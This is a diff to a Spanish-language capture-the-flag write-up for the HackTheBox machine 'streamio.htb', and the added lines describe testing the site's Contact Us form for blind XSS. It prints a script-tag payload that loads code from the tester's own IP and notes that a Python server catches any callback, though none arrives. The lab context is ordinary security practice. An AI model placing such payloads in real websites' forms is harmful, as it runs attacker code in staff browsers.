@@ -80,3 +80,12 @@ AL no encontrar mas información relevante en las pruebas realizadas anteriormen
 https://streamio.htb/
 ```
 
+Vemos que hay una zona de CONTAC US, en la cual se indica al enviar el mensaje hay una persona revisando la incidencia y que envía una respuesta, probaremos a hacer una inyección XSS para ver si esto se acontece
+```js
+<script src="http://10.10.14.116/test"></script>
+```
+
+En nuestra maquina nos levantaremos un servidor con python
+Vemos que no se nos devuelve ninguna respuesta
+
+### Fuzzing
